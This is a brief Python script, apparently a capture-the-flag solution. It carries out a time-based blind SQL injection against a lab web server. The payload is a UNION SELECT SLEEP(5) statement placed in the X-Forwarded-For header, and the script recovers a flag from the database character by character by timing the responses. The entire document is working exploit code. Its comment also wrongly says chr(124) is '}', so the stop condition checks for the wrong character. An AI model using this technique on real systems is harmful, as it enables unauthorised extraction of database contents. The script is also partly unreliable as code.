#!/usr/bin/python3

import requests
import time
import string

server = "10.10.156.243" # IP or servername if in host file
flag = ""
loop = 1

while chr(124) not in flag: # chr(124) is "}"
    for a in range (48,126):
        start = time.time()
        r = requests.get(url="http://" + server, headers={'X-Forwarded-For':f"1' UNION SELECT SLEEP(5),2,3 from flag where (ASCII(SUBSTR(flag,{loop},1))) = '{a}';--"})
        end = time.time()
        if end - start >= 2:
            flag += chr(a)
            loop +=1
            print("Finding flag: ", flag, end="\r")
            break
print("Flag found: ", flag)